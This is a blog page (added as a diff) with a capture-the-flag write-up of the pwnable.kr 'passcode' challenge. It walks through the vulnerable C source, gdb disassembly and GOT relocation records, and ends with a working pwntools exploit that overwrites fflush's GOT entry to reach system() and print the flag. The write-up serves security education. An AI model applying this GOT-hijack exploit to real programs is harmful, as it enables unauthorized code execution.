@@ -1,0 +1,645 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="MobileOptimized" content="320">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="referrer" content="no-referrer">
+    <meta name="description" content="">
+
+    
+      <link href="https://fonts.googleapis.com/css?family=Open+Sans:400|Old+Standard+TT:400&display=swap" rel="stylesheet" media="print" type="text/css" onload="this.media='all'">
+    
+
+    <title>
+      
+      
+         Writeup: passcode 
+      
+    </title>
+    <link rel="canonical" href="https://chuang76.github.io/posts/passcode/">
+
+    <style>
+  * {
+    border:0;
+    font:inherit;
+    font-size:100%;
+    vertical-align:baseline;
+    margin:0;
+    padding:0;
+    color: black;
+    text-decoration-skip: ink;
+  }
+
+  body {
+     
+     
+    font-family: 'Verdana'; 
+    font-size:17px;
+    line-height:160%;
+    color:#1d1313;
+    max-width:700px;
+    margin:auto;
+  }
+
+  p {
+    margin: 20px 0;
+  }
+
+  a img {
+    border:none;
+  }
+
+  img {
+    margin: 10px auto 10px auto;
+    max-width: 100%;
+    display: block;
+  }
+
+  .left-justify { float: left; }
+  .right-justify { float:right; }
+
+  pre, code {
+    font: 12px Consolas, "Liberation Mono", Menlo, Courier, monospace;
+    background-color: #f7f7f7;
+  }
+
+  code {
+    font-size: 12px;
+    padding: 4px;
+  }
+
+  pre {
+    margin-top: 0;
+    margin-bottom: 16px;
+    word-wrap: normal;
+    padding: 16px;
+    overflow: auto;
+    font-size: 85%;
+    line-height: 1.45;
+  }
+
+  pre>code {
+    padding: 0;
+    margin: 0;
+    font-size: 100%;
+    word-break: normal;
+    white-space: pre;
+    background: transparent;
+    border: 0;
+  }
+
+  pre code {
+    display: inline;
+    padding: 0;
+    margin: 0;
+    overflow: visible;
+    line-height: inherit;
+    word-wrap: normal;
+    background-color: transparent;
+    border: 0;
+  }
+
+  pre code::before,
+  pre code::after {
+    content: normal;
+  }
+
+  em,q,em,dfn {
+    font-style:italic;
+  }
+
+  .sans,html .gist .gist-file .gist-meta {
+    font-family:"Open Sans","Myriad Pro",Myriad,sans-serif;
+  }
+
+  .mono,pre,code,tt,p code,li code {
+    font-family:Menlo,Monaco,"Andale Mono","lucida console","Courier New",monospace;
+  }
+
+  .heading,.serif,h1,h2,h3 {
+    font-family:"Old Standard TT",serif;
+  }
+
+  strong {
+    font-weight:600;
+  }
+
+  q:before {
+    content:"\201C";
+  }
+
+  q:after {
+    content:"\201D";
+  }
+
+  del,s {
+    text-decoration:line-through;
+  }
+
+  blockquote {
+    font-family:"Old Standard TT",serif;
+    text-align:center;
+    padding:50px;
+  }
+
+  blockquote p {
+    display:inline-block;
+    font-style:italic;
+  }
+
+  blockquote:before,blockquote:after {
+    font-family:"Old Standard TT",serif;
+    content:'\201C';
+    font-size:35px;
+    color:#403c3b;
+  }
+
+  blockquote:after {
+    content:'\201D';
+  }
+
+  hr {
+    width:40%;
+    height: 1px;
+    background:#403c3b;
+    margin: 25px auto;
+  }
+
+  h1 {
+    font-size:35px;
+  }
+
+  h2 {
+    font-size:28px;
+  }
+
+  h3 {
+    font-size:22px;
+    margin-top:18px;
+  }
+
+  h1 a,h2 a,h3 a {
+    text-decoration:none;
+  }
+
+  h1,h2 {
+    margin-top:28px;
+  }
+
+  #sub-header, .date {
+    color:#403c3b;
+    font-size:13px;
+  }
+
+  #sub-header {
+    margin: 0 4px;
+  }
+
+  #nav h1 a {
+    font-size:35px;
+    color:#1d1313;
+    line-height:120%;
+  }
+
+  .posts_listing a,#nav a {
+    text-decoration: none;
+  }
+
+  li {
+    margin-left: 20px;
+  }
+
+  ul li {
+    margin-left: 5px;
+  }
+
+  ul li {
+    list-style-type: none;
+  }
+  ul li:before {
+    content:"\00BB \0020";
+  }
+
+  #nav ul li:before, .posts_listing li:before {
+    content:'';
+    margin-right:0;
+  }
+
+  #content {
+    text-align:left;
+    width:100%;
+    font-size:15px;
+    padding:60px 0 80px;
+  }
+
+  #content h1,#content h2 {
+    margin-bottom:5px;
+  }
+
+  #content h2 {
+    font-size:25px;
+  }
+
+  #content .entry-content {
+    margin-top:15px;
+  }
+
+  #content .date {
+    margin-left:3px;
+  }
+
+  #content h1 {
+    font-size:30px;
+  }
+
+  .highlight {
+    margin: 10px 0;
+  }
+
+  .posts_listing {
+    margin:0 0 50px;
+  }
+
+  .posts_listing li {
+    margin:0 0 25px 15px;
+  }
+
+  .posts_listing li a:hover,#nav a:hover {
+    text-decoration: underline;
+  }
+
+  #nav {
+    text-align:center;
+    position:static;
+    margin-top:60px;
+  }
+
+  #nav ul {
+    display: table;
+    margin: 8px auto 0 auto;
+  }
+
+  #nav li {
+    list-style-type:none;
+    display:table-cell;
+    font-size:15px;
+    padding: 0 20px;
+  }
+
+  #links {
+    display: flex;
+    justify-content: space-between;
+    margin: 50px 0 0 0;
+  }
+
+  #links :nth-child(1) {
+    margin-right:0.5em;;
+  }
+
+  #links :nth-child(2) {
+    margin-left:0.5em;;
+  }
+
+  #not-found {
+    text-align: center;
+  }
+
+  #not-found a {
+    font-family:"Old Standard TT",serif;
+    font-size: 200px;
+    text-decoration: none;
+    display: inline-block;
+    padding-top: 225px;
+  }
+
+  @media (max-width: 750px) {
+    body {
+      padding-left:20px;
+      padding-right:20px;
+    }
+
+    #nav h1 a {
+      font-size:28px;
+    }
+
+    #nav li {
+      font-size:13px;
+      padding: 0 15px;
+    }
+
+    #content {
+      margin-top:0;
+      padding-top:50px;
+      font-size:14px;
+    }
+
+    #content h1 {
+      font-size:25px;
+    }
+
+    #content h2 {
+      font-size:22px;
+    }
+
+    .posts_listing li div {
+      font-size:12px;
+    }
+  }
+
+  @media (max-width: 400px) {
+    body {
+      padding-left:20px;
+      padding-right:20px;
+    }
+
+    #nav h1 a {
+      font-size:22px;
+    }
+
+    #nav li {
+      font-size:12px;
+      padding: 0 10px;
+    }
+
+    #content {
+      margin-top:0;
+      padding-top:20px;
+      font-size:12px;
+    }
+
+    #content h1 {
+      font-size:20px;
+    }
+
+    #content h2 {
+      font-size:18px;
+    }
+
+    .posts_listing li div{
+      font-size:12px;
+    }
+  }
+
+  @media (prefers-color-scheme: dark) {
+    *, #nav h1 a {
+      color: #FDFDFD;
+    }
+
+    body {
+      background: #121212;
+    }
+
+    pre, code {
+      background-color: #262626;
+    }
+
+    #sub-header, .date {
+      color: #BABABA;
+    }
+
+    hr {
+      background: #EBEBEB;
+    }
+  }
+</style>
+
+
+    </head>
+
+  <body>
+    <section id=nav>
+      <h1><a href="https://chuang76.github.io/">Before Dawn</a></h1>
+      <ul>
+        
+      </ul>
+    </section>
+
+
+<section id=content>
+  <h1> Writeup: passcode </h1>
+
+  
+    <div id=sub-header>
+      December 2020 
+    </div>
+  
+
+  <div class="entry-content">
+    <p>This is a challenge from <a href="http://pwnable.kr/play.php">pwnable.kr</a>, it is a 32-bit ELF file without stripped.</p>
+<pre><code>passcode@pwnable:~$ file passcode
+passcode: setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.24, BuildID[sha1]=d2b7bd64f70e46b1b0eb7036b35b24a651c3666b, not stripped
+</code></pre><p>The source code could be displayed as follows.</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">passcode<span style="">@</span>pwnable:~<span style="">$</span> cat passcode.c
+<span style="">#include</span> <span style="">&lt;stdio.h&gt;</span><span style="">
+</span><span style="">#include</span> <span style="">&lt;stdlib.h&gt;</span><span style="">
+</span><span style=""></span>
+<span style="">void</span> login(){
+        <span style="">int</span> passcode1;
+        <span style="">int</span> passcode2;
+
+        printf(<span style="font-style:italic">&#34;enter passcode1 : &#34;</span>);
+        scanf(<span style="font-style:italic">&#34;%d&#34;</span>, passcode1);
+        fflush(stdin);
+
+        <span style="font-style:italic">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
+</span><span style="font-style:italic"></span>        printf(<span style="font-style:italic">&#34;enter passcode2 : &#34;</span>);
+        scanf(<span style="font-style:italic">&#34;%d&#34;</span>, passcode2);
+
+        printf(<span style="font-style:italic">&#34;checking...</span><span style="font-weight:bold;font-style:italic">\n</span><span style="font-style:italic">&#34;</span>);
+        <span style="font-weight:bold">if</span>(passcode1==338150 &amp;&amp; passcode2==13371337){
+                printf(<span style="font-style:italic">&#34;Login OK!</span><span style="font-weight:bold;font-style:italic">\n</span><span style="font-style:italic">&#34;</span>);
+                system(<span style="font-style:italic">&#34;/bin/cat flag&#34;</span>);
+        }
+        <span style="font-weight:bold">else</span>{
+                printf(<span style="font-style:italic">&#34;Login Failed!</span><span style="font-weight:bold;font-style:italic">\n</span><span style="font-style:italic">&#34;</span>);
+                exit(0);
+        }
+}
+
+<span style="">void</span> welcome(){
+        <span style="">char</span> name[100];
+        printf(<span style="font-style:italic">&#34;enter you name : &#34;</span>);
+        scanf(<span style="font-style:italic">&#34;%100s&#34;</span>, name);
+        printf(<span style="font-style:italic">&#34;Welcome %s!</span><span style="font-weight:bold;font-style:italic">\n</span><span style="font-style:italic">&#34;</span>, name);
+}
+
+<span style="">int</span> main(){
+        printf(<span style="font-style:italic">&#34;Toddler&#39;s Secure Login System 1.0 beta.</span><span style="font-weight:bold;font-style:italic">\n</span><span style="font-style:italic">&#34;</span>);
+
+        welcome();
+        login();
+
+        <span style="font-style:italic">// something after login...
+</span><span style="font-style:italic"></span>        printf(<span style="font-style:italic">&#34;Now I can safely trust you that you have credential :)</span><span style="font-weight:bold;font-style:italic">\n</span><span style="font-style:italic">&#34;</span>);
+        <span style="font-weight:bold">return</span> 0;
+}
+</code></pre></div><p>As you can see, our goal is to execute system(&quot;/bin/cat flag&quot;). Let&rsquo;s check the protection mechanism of the executable first.</p>
+<pre><code>passcode@pwnable:~$ checksec passcode
+[*] '/home/passcode/passcode'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+</code></pre><p>Here are some ideas, since we can not exploit passcode1/passcode2 and buffer overflow directly, we&rsquo;re going to modify the GOT in order to force the program to execute our target.</p>
+<pre><code>1. modify the values of passcode1 and passcode2 -&gt; not writable -&gt; x 
+2. exploit buffer overflow -&gt; canary is found -&gt; x 
+3. hijack the GOT -&gt; partial RELRO -&gt; v 
+</code></pre><p>Note that scanf function in the source code lacks the address of operator (&amp;), so our input would be treated as the address. We need to find out the location of &ldquo;name&rdquo;, let&rsquo;s check it with gdb tool. As you can see, &ldquo;name&rdquo; is at [ebp - 0x70], where ebp is 0xff87eea8 at this point.</p>
+<pre><code>(gdb) disas welcome
+Dump of assembler code for function welcome:
+   0x08048609 &lt;+0&gt;:     push   %ebp
+   0x0804860a &lt;+1&gt;:     mov    %esp,%ebp
+   0x0804860c &lt;+3&gt;:     sub    $0x88,%esp
+   0x08048612 &lt;+9&gt;:     mov    %gs:0x14,%eax
+   0x08048618 &lt;+15&gt;:    mov    %eax,-0xc(%ebp)
+   0x0804861b &lt;+18&gt;:    xor    %eax,%eax
+   0x0804861d &lt;+20&gt;:    mov    $0x80487cb,%eax
+   0x08048622 &lt;+25&gt;:    mov    %eax,(%esp)
+   0x08048625 &lt;+28&gt;:    call   0x8048420 &lt;printf@plt&gt;
+   0x0804862a &lt;+33&gt;:    mov    $0x80487dd,%eax
+   0x0804862f &lt;+38&gt;:    lea    -0x70(%ebp),%edx
+   0x08048632 &lt;+41&gt;:    mov    %edx,0x4(%esp)
+   0x08048636 &lt;+45&gt;:    mov    %eax,(%esp)
+   0x08048639 &lt;+48&gt;:    call   0x80484a0 &lt;__isoc99_scanf@plt&gt;
+   0x0804863e &lt;+53&gt;:    mov    $0x80487e3,%eax
+   0x08048643 &lt;+58&gt;:    lea    -0x70(%ebp),%edx
+   0x08048646 &lt;+61&gt;:    mov    %edx,0x4(%esp)
+   0x0804864a &lt;+65&gt;:    mov    %eax,(%esp)
+   0x0804864d &lt;+68&gt;:    call   0x8048420 &lt;printf@plt&gt;
+   0x08048652 &lt;+73&gt;:    mov    -0xc(%ebp),%eax
+   0x08048655 &lt;+76&gt;:    xor    %gs:0x14,%eax
+   0x0804865c &lt;+83&gt;:    je     0x8048663 &lt;welcome+90&gt;
+   0x0804865e &lt;+85&gt;:    call   0x8048440 &lt;__stack_chk_fail@plt&gt;
+   0x08048663 &lt;+90&gt;:    leave  
+   0x08048664 &lt;+91&gt;:    ret    
+End of assembler dump.
+(gdb) b *0x0804862f
+Breakpoint 1 at 0x804862f
+(gdb) r
+Starting program: /home/passcode/passcode
+Toddler's Secure Login System 1.0 beta.
+
+Breakpoint 1, 0x0804862f in welcome ()
+(gdb) x/i $pc
+=&gt; 0x804862f &lt;welcome+38&gt;:      lea    -0x70(%ebp),%edx
+(gdb) info registers ebp
+ebp            0xff87eea8       0xff87eea8
+</code></pre><p>We also need the location of &ldquo;passcode1&rdquo;. Similarly, check it with gdb tool again. You can input an arbitrary value as the string &ldquo;name&rdquo;.</p>
+<pre><code>(gdb) disas login
+Dump of assembler code for function login:
+   0x08048564 &lt;+0&gt;:     push   %ebp
+   0x08048565 &lt;+1&gt;:     mov    %esp,%ebp
+   0x08048567 &lt;+3&gt;:     sub    $0x28,%esp
+   0x0804856a &lt;+6&gt;:     mov    $0x8048770,%eax
+   0x0804856f &lt;+11&gt;:    mov    %eax,(%esp)
+   0x08048572 &lt;+14&gt;:    call   0x8048420 &lt;printf@plt&gt;
+   0x08048577 &lt;+19&gt;:    mov    $0x8048783,%eax
+   0x0804857c &lt;+24&gt;:    mov    -0x10(%ebp),%edx
+   0x0804857f &lt;+27&gt;:    mov    %edx,0x4(%esp)
+   0x08048583 &lt;+31&gt;:    mov    %eax,(%esp)
+   0x08048586 &lt;+34&gt;:    call   0x80484a0 &lt;__isoc99_scanf@plt&gt;
+   0x0804858b &lt;+39&gt;:    mov    0x804a02c,%eax
+   0x08048590 &lt;+44&gt;:    mov    %eax,(%esp)
+   0x08048593 &lt;+47&gt;:    call   0x8048430 &lt;fflush@plt&gt;
+   0x08048598 &lt;+52&gt;:    mov    $0x8048786,%eax
+   0x0804859d &lt;+57&gt;:    mov    %eax,(%esp)
+   0x080485a0 &lt;+60&gt;:    call   0x8048420 &lt;printf@plt&gt;
+   0x080485a5 &lt;+65&gt;:    mov    $0x8048783,%eax
+   0x080485aa &lt;+70&gt;:    mov    -0xc(%ebp),%edx
+   0x080485ad &lt;+73&gt;:    mov    %edx,0x4(%esp)
+   0x080485b1 &lt;+77&gt;:    mov    %eax,(%esp)
+   0x080485b4 &lt;+80&gt;:    call   0x80484a0 &lt;__isoc99_scanf@plt&gt;
+   0x080485b9 &lt;+85&gt;:    movl   $0x8048799,(%esp)
+   0x080485c0 &lt;+92&gt;:    call   0x8048450 &lt;puts@plt&gt;
+   0x080485c5 &lt;+97&gt;:    cmpl   $0x528e6,-0x10(%ebp)
+   0x080485cc &lt;+104&gt;:   jne    0x80485f1 &lt;login+141&gt;
+   0x080485ce &lt;+106&gt;:   cmpl   $0xcc07c9,-0xc(%ebp)
+   0x080485d5 &lt;+113&gt;:   jne    0x80485f1 &lt;login+141&gt;
+   0x080485d7 &lt;+115&gt;:   movl   $0x80487a5,(%esp)
+   0x080485de &lt;+122&gt;:   call   0x8048450 &lt;puts@plt&gt;
+   0x080485e3 &lt;+127&gt;:   movl   $0x80487af,(%esp)
+   0x080485ea &lt;+134&gt;:   call   0x8048460 &lt;system@plt&gt;
+   0x080485ef &lt;+139&gt;:   leave  
+   0x080485f0 &lt;+140&gt;:   ret    
+   0x080485f1 &lt;+141&gt;:   movl   $0x80487bd,(%esp)
+   0x080485f8 &lt;+148&gt;:   call   0x8048450 &lt;puts@plt&gt;
+   0x080485fd &lt;+153&gt;:   movl   $0x0,(%esp)
+   0x08048604 &lt;+160&gt;:   call   0x8048480 &lt;exit@plt&gt;
+End of assembler dump.
+(gdb) b *0x0804857c
+Breakpoint 2 at 0x804857c
+(gdb) c
+Continuing.
+enter you name : 123
+Welcome 123!
+
+Breakpoint 2, 0x0804857c in login ()
+(gdb) x/i $pc
+=&gt; 0x804857c &lt;login+24&gt;:        mov    -0x10(%ebp),%edx
+(gdb) info registers ebp
+ebp            0xff87eea8       0xff87eea8
+</code></pre><p>As you can see, &ldquo;passcode1&rdquo; is at [ebp - 0x10], where ebp is 0xff87eea8 at this point. Both of &ldquo;name&rdquo; and &ldquo;passcode1&rdquo; have the same ebp, so the offset between &ldquo;name&rdquo; and &ldquo;passcode1&rdquo; is 0x60, which is the number of bytes needed to cover later. Besides, the size of the string &ldquo;name&rdquo; is 100, so we can cover the last 4 bytes and redirect to other functions whose GOT will be modified later. In this way, we can force the victim function to execute our target.</p>
+<p>Hence, the next step is to modify the GOT. Check the dynamic relocation entries with objdump command.</p>
+<pre><code>passcode@pwnable:~$ objdump -R ./passcode
+
+./passcode:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+08049ff0 R_386_GLOB_DAT    __gmon_start__
+0804a02c R_386_COPY        stdin@@GLIBC_2.0
+0804a000 R_386_JUMP_SLOT   printf@GLIBC_2.0
+0804a004 R_386_JUMP_SLOT   fflush@GLIBC_2.0
+0804a008 R_386_JUMP_SLOT   __stack_chk_fail@GLIBC_2.4
+0804a00c R_386_JUMP_SLOT   puts@GLIBC_2.0
+0804a010 R_386_JUMP_SLOT   system@GLIBC_2.0
+0804a014 R_386_JUMP_SLOT   __gmon_start__
+0804a018 R_386_JUMP_SLOT   exit@GLIBC_2.0
+0804a01c R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0
+0804a020 R_386_JUMP_SLOT   __isoc99_scanf@GLIBC_2.7
+</code></pre><p>According to the source code, after entering the password1, the program will execute fflush and printf function. So our victim function could be either fflush (0x0804a004) or printf (0x0804a000). Apart from that, since our goal is to run the executable flag, we can update the address as 0x080485d7 (print Login OK! -&gt; system) or 0x080485e3 (ignore print Login OK!, execute system directly). You can use combinations of them.</p>
+<p>Here is one of the solutions.</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="font-weight:bold">from</span> <span style="font-weight:bold">pwn</span> <span style="font-weight:bold">import</span> *
+context(arch=<span style="font-style:italic">&#39;i386&#39;</span>)
+
+sh = ssh(host=<span style="font-style:italic">&#39;pwnable.kr&#39;</span>, user=<span style="font-style:italic">&#39;passcode&#39;</span>, password=<span style="font-style:italic">&#39;guest&#39;</span>, port=2222)
+proc = sh.process(<span style="font-style:italic">&#39;./passcode&#39;</span>)
+payload = <span style="font-style:italic">&#39;a&#39;</span> * 0x60 + p32(0x0804a004) + str(0x080485d7) 
+proc.sendlineafter(<span style="font-style:italic">&#39;enter you name : &#39;</span>, payload)
+proc.interactive()
+</code></pre></div><p>The flag is as follows.</p>
+<pre><code>$ python exp.py
+[+] Connecting to pwnable.kr on port 2222: Done
+[*] passcode@pwnable.kr:
+    Distro    Ubuntu 16.04
+    OS:       linux
+    Arch:     amd64
+    Version:  4.4.179
+    ASLR:     Enabled
+[+] Starting remote process './passcode' on pwnable.kr: pid 447293
+[*] Switching to interactive mode
+Welcome aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x04\x04!
+enter passcode1 : Login OK!
+Sorry mom.. I got confused about scanf usage :(
+Now I can safely trust you that you have credential :)
+[*] Got EOF while reading in interactive
+</code></pre>
+  </div>
+
+  <div id=links>
+    
+      <a href="https://chuang76.github.io/posts/payload/">&laquo;&nbsp;Writeup: payload</a>
+    
+    
+  </div>
+</section>
+
+  
+</body>
+</html>
+
+
+
